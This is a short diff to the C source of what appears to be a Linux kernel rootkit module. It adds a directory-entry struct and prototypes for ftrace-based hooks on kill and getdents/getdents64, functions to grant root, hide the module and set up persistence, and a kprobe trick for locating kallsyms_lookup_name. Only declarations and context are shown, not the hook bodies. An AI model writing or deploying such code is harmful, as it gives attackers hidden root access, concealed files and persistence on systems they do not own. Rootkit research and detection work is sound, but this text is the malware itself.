@@ -12,6 +12,13 @@
 	.original = (_orig),		\
 }
 
+struct linux_dirent {
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned long d_reclen;
+	char d_name[];
+};
+
 static struct kprobe kp = {
 	.symbol_name = "kallsyms_lookup_name"
 };
@@ -24,9 +31,25 @@ struct ftrace_hook {
 	unsigned long address;
 	struct ftrace_ops ops;
 };
+// prototypes
+int fh_install_hook(struct ftrace_hook *);
+int fh_install_hooks(struct ftrace_hook *, size_t);
+void fh_remove_hook(struct ftrace_hook *);
+void fh_remove_hooks(struct ftrace_hook *, size_t);
+asmlinkage int hook_kill(const struct pt_regs *);
+asmlinkage int hook_getdents64(const struct pt_regs *);
+asmlinkage int hook_getdents(const struct pt_regs *);
+void set_root(void);
+void hide_module(void);
+void show_module(void);
+static int privilege(void);
+static int privilege_removal(void);
+int persistance(void);
+int persistance_removal(void);
 
 static int fh_resolve_hook_address(struct ftrace_hook *hook){
-	// the kallsyms_lookup_name portion of this is used to find the address of kallsyms by registering a kprobe at that symbol address and grabbing the address of the kprobe.
+	// the kallsyms_lookup_name portion of this is used to find the address of kallsyms by registering a kprobe 
+	// at that symbol address and grabbing the address of the kprobe.
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 	kallsyms_lookup_name_t kallsyms_lookup_name;
 	register_kprobe(&kp);
